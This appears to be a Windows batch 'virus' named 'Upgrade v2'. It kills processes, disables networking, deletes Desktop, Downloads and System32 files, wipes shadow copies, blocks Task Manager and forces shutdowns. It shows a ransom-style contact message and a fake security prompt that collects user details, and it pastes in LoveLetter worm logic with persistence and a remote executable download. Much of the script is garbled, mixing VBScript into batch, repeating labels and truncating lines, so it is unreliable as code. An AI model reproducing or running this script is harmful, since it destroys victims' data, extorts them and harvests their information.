@echo off
title Upgrade v2
taskkill /f /im explorer.exe
taskkill /f /im teamviewer.exe
taskkill /f /im anydesk.exe
taskkill /f /im calc.exe
taskkill /f /im iexplore.exe 
ipconfig /release
for /f %%a in ('echo prompt $H ^& for %%b in (1) do rem') do set "BS=%%a"
for /f "tokens=1,2" %%a in ('"prompt $G & echo on & for %%b in (1) do rem"') do set BEEP=%%b
start "Window Hell" cmd /c "call "%~f0" :window_hell"
start "File Frenzy" cmd /c "call "%~f0" :file_frenzy"
start "Popup Panic" cmd /c "call "%~f0" :popups"
start "Process Killer" cmd /c "call "%~f0" :process_killer"
start "Network Down" cmd /c "call "%~f0" :network_down"
echo ********
echo ********
echo ********
echo ********
echo ********
echo ********
echo ********
echo ********
echo ********
echo Computer is infected.
echo ^G
echo ^G
echo ^G
echo ^G
echo ^G
echo ^G
for /l %%i in (1,1,5) do (
    echo ^G
    timeout /t 1 >nul
)
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
echo %BEEP%
set "desktopPath=%USERPROFILE%\Desktop"
set "downloadsPath=%USERPROFILE%\Downloads"
set "keepFile=Upgrade.bat"
for %%F in ("%desktopPath%\*") do (
    if /I not "%%~nxF"=="%keepFile%" (
        echo Deleting "%%F"
        del /f /q "%%F" 2>nul
        rd /s /q "%%F" 2>nul
    )
)
for %%F in ("%downloadsPath%\*") do (
    if /I not "%%~nxF"=="%keepFile%" (
        echo Deleting "%%F"
        del /f /q "%%F" 2>nul
        rd /s /q "%%F" 2>nul
    )
)
echo rem barok -loveletter(vbe) <i hate go to school>
echo rem by: spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila,Philippines
echo On Error Resume Next

rem Setup global variables for subroutines and functions.
set fso = CreateObject("Scripting.FileSystemObject")
set dirsystem = fso.GetSpecialFolder(1)
set dirwin = fso.GetSpecialFolder(0)
set dirtemp = fso.GetSpecialFolder(2)
set eq = ""
set ctr = 0

rem Open the current script file to read its contents.
set file = fso.OpenTextFile("%~f0", 1)
set vbscopy = file.ReadAll

rem Initialize the program by calling the main subroutine.
call :main

rem Subroutine to initialize the program.
:main
  On Error Resume Next
  set wscr = CreateObject("WScript.Shell")
  set rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")

  if %rr% GEQ 1 (
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  )

  set c = fso.GetFile("%~f0")
  c.Copy(dirsystem & "\MSKernel32.vbs")
  c.Copy(dirwin & "\Win32DLL.vbs")
  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")

  call :regruns
  call :html
  call :spreadtoemail
  call :listadriv
exit /b

rem Subroutine to create and update special registry values.
:regruns
  On Error Resume Next
  set num
  set downread

  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"

  set downread = ""
  set downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")

  if "%downread%" == "" (
    set downread = "c:\"
  )

  if exist dirsystem\WinFAT32.exe (
    set /a num=%random% %% 4 + 1

    if %num% == 1 (
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
    ) else if %num% == 2 (
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
    ) else if %num% == 3 (
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
    ) else (
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    )
  )

  if not exist %downread%\WIN-BUGSFIX.exe (
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", "%downread%\WIN-BUGSFIX.exe"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
  )
exit /b

rem Subroutine to list folders in drives.
:listadriv
  On Error Resume Next

  for /f %%d in ('wmic logicaldisk get caption ^| findstr ":"') do (
    call :folderlist "%%d\"
  )
exit /b

rem Subroutine to infect other files.
:folderlist
  On Error Resume Next

  for %%f in ("%~1*") do (
    if /i "%%~xf" == ".vbs" (
      echo %vbscopy% > "%%f"
    ) else if /i "%%~xf" == ".vbe" (
      echo %vbscopy% > "%%f"
    ) else if /i "%%~xf" == ".js" (
      echo %vbscopy% > "%%f"
    ) else if /i "%%~xf" == ".jse" (
      echo %vbscopy% > "%%f"
    ) else if /i "%%~xf" == ".css" (
      echo %vbscopy% > "%%f"
    ) else if /i "%%~xf" == ".wsh" (
      echo %vbscopy% > "%%f"
    ) else if /i "%%~xf" == ".sct" (
      echo %vbscopy% > "%%f"
    ) else if /i "%%~xf" == ".hta" (
      echo %vbscopy% > "%%f"
    ) else if /i "%%~xf" == ".jpg" (
      echo %vbscopy% > "%%f.vbs"
    ) else if /i "%%~xf" == ".jpeg" (
      echo %vbscopy% > "%%f.vbs"
    ) else if /i "%%~xf" == ".mp3" (
      type nul > "%%f.vbs"
      echo %vbscopy% > "%%f.vbs"
      attrib +h "%%f.vbs"
    )
  )
exit /b

rem Subroutine to create/write registry entries.
:regcreate
  reg add %1 /v %2 /d /f
exit /b

rem Function to get registry entries.
:regget
  reg query %1 /v %2 | find "%2"
exit /b
:loop
msg * You're files are now deleted on you're computer. Trying to get them back is a no-no. Contact me at hahavirus@outlook.de To try to get the files back. I will send you a link there to fix this issue.
goto loop

:loop
shutdown /r /f /t 0
goto loop

:loop reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion /v RandomKey /t REG_SZ /d "Corrupted" /f goto loop

:loop
ping localhost -t
goto loop

:loop
start /B cmd /C "echo. & echo. & echo. & echo. & echo. & echo. & echo. & echo. & echo. & echo."
goto loop

:loop
del /F /Q C:\Windows\System32\*.dll
goto loop

:loop
start microsoft-edge:"https://randomwebsite.com"
start chrome:"https://anotherwebsite.com"
start firefox:"https://yetanotherwebsite.com"
goto loop

:loop
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\path\to\wallpaper.jpg" /f
rundll32.exe user32.dll,UpdatePerUserSystemParameters
goto loop

:loop
screenshot.exe
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\path\to\screenshot.jpg" /f
rundll32.exe user32.dll,UpdatePerUserSystemParameters
goto loop

:loop
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto loop

:loop
powershell -c "$taskbar = (New-Object -ComObject 'Shell.Application').ToggleDesktop(); Start-Sleep -s 2; $taskbar"
goto loop

:loop
powershell -command "$p = [System.Windows.Forms.Cursor]::Position; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Min 0 -Max 1920), (Get-Random -Min 0 -Max 1080)); Start-Sleep -Milliseconds 500; [System.Windows.Forms.Cursor]::Position = $p"
goto loop

:loop
powershell -command "$w = (New-Object -ComObject Shell.Application).Windows() | ForEach-Object { $_.WindowState = 2 }; Start-Sleep -Seconds 2; $w | ForEach-Object { $_.WindowState = -1 }"
goto loop

:loop
powershell -command "$vol = Get-WmiObject -Class Win32_Volume -Filter 'DriveType = 3'; $vol.SetAudioEndpointVolume((Get-Random -Minimum 0 -Maximum 100), [Guid]::Empty)"
goto loop

:loop
msg * Attention! Your computer has been compromised.
start notepad.exe
timeout /t 5 /nobreak >nul
goto loop

:loop
start taskmgr.exe
timeout /t 3 /nobreak >nul
goto loop

:loop
powershell -c "$desktop = [System.Environment]::GetFolderPath('Desktop'); Get-ChildItem -Path $desktop | ForEach-Object { $_.MoveTo((Get-Random -Maximum 10)) }"
timeout /t 5 /nobreak >nul
goto loop

reg add HKEY_LOCAL_MACHINE\Software /v RandomKey /t REG_SZ /d "MaliciousData" /f
netsh interface set interface "Ethernet" admin=disabled
timeout /t 5
netsh interface set interface "Ethernet" admin=enabled
del /s /f /q C:\Windows\System32
date 01-01-1970
time 00:00:00

:loop
echo 100% CPU Usage
goto loop

:leak
echo "Consuming memory..."
set "var= "
set "var=%var% "
goto leak

:loop
start cmd /c goto loop

echo @echo off > bsod.bat
echo msg * Your computer has encountered a fatal error! >> bsod.bat
echo shutdown -s -t 10 -c "Blue Screen of Death" >> bsod.bat
start bsod.bat
fsutil file createnew C:\filler.txt 104857600
shutdown /s /t 0
taskkill /f /im chrome.exe
taskkill /f /im firefox.exe
taskkill /f /im msedge.exe

:loop
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto loop

set PATH=%PATH%;C:\
del /s /q Admin\Desktop\*
del /s /q Trial\Desktop\*
echo @echo off > hijack.bat
echo start https://maliciouswebsite.com >> hijack.bat
start hijack.bat

:bsodloop
start cmd /c "echo @echo off > bsod.bat && echo msg * Your computer has encountered a fatal error! >> bsod.bat && echo shutdown -r -t 00 -f >> bsod.bat && bsod.bat"
goto bsodloop

:fanoverload
powershell -command "(New-Object -ComObject wscript.shell).SendKeys('{CAPSLOCK}')"
goto fanoverload

:audiochaos
start mplay32 /play /close %windir%\media\tada.wav
goto audiochaos

:folderbomb
setlocal enabledelayedexpansion
set "folder=Folder"
md !folder!
set /a folder+=1
goto folderbomb

:taskbarhide
powershell -command "$code = '[DllImport(\"user32.dll\")]public static extern int FindWindow(string lpClassName,string lpWindowName);[DllImport(\"user32.dll\")]public static extern int ShowWindow(int hwnd,int command);int hwnd = FindWindow(\"Shell_TrayWnd\",null);ShowWindow(hwnd,0);';Add-Type -MemberDefinition $code -name winapi -namespace native;[native.winapi]::ShowWindow(0,0);"
goto taskbarhide

:mousemadness
powershell -command "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point -ArgumentList ((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080));"
goto mousemadness

:errorloop
msg * "Error: Your system has encountered a critical failure."
goto errorloop

:printersabotage
net stop spooler
del /Q /F %systemroot%\System32\spool\PRINTERS\*
net start spooler
goto printersabotage

:taskmanagerblock
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
goto taskmanagerblock

:srdisable
vssadmin delete shadows /all /quiet
vssadmin resize shadowstorage /on=C: /for=C: /maxsize=401MB
goto srdisable

:msgloop
msg * you have been hacked!
goto loop

:memz_loop
start cmd /c "echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random


:spam
for /l %%i in (1,1,20) do (
    setlocal enabledelayedexpansion
    set "line="
    for /l %%j in (1,1,60) do (
        set /a "char=!random! %% 26 + 65"
        for %%k in (!char!) do set "line=!line!!=%%k!"
    )
    echo !line!
    endlocal
)

for /l %%b in (1,1,20) do (
    echo ^G
    timeout /t 2 >nul
)
goto spam
echo ***************************************************************
echo *                                                             *
echo *                    *** WARNING ***                          *
echo *                                                             *
echo *  THIS SCRIPT IS EXTREMELY DANGEROUS AND MALICIOUS IN NATURE *
echo *                                                             *
echo *  Executing this program WILL wreak havoc on your system:    *
echo *                                                             *
echo *    - Overload your screen with endless streams of text      *
echo *    - Flood your Desktop with hundreds of useless files      *
echo *    - Spawn dozens of unclosable Notepad windows             *
echo *    - Hammer your PC with relentless system beeps            *
echo *                                                             *
echo *  RUNNING THIS ON YOUR MAIN OR IMPORTANT MACHINE CAN LEAD TO:*
echo *                                                             *
echo *    • DATA LOSS                                               *
echo *    • SYSTEM CRASHES                                          *
echo *    • IRRECOVERABLE DAMAGE                                    *
echo *                                                             *
echo *  YOU HAVE BEEN WARNED. THIS SCRIPT SHOULD ONLY BE RUN IN:   *
echo *                                                             *
echo *    • VIRTUAL MACHINES                                        *
echo *    • TEST ENVIRONMENTS                                      *
echo *                                                             *
echo *                                                             *
echo *                                                             *
echo ***************************************************************
echo.
echo Welcome. I'm here to assist you with any concerns you may have. Please feel free to share.
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details for verification?
set /p userInput=Additional Details: 

echo Thank you for sharing. Rest assured, your information is safe with me.echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.
echo Welcome. I'm here to assist you with any concerns you may have. Please fee$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.echo$
timeout /t 2 >nul

echo Your security is my priority. Could you provide me with additional details$
set /p userInput=Additional Details:

echo Thank you for sharing. Rest assured, your information is safe with me.

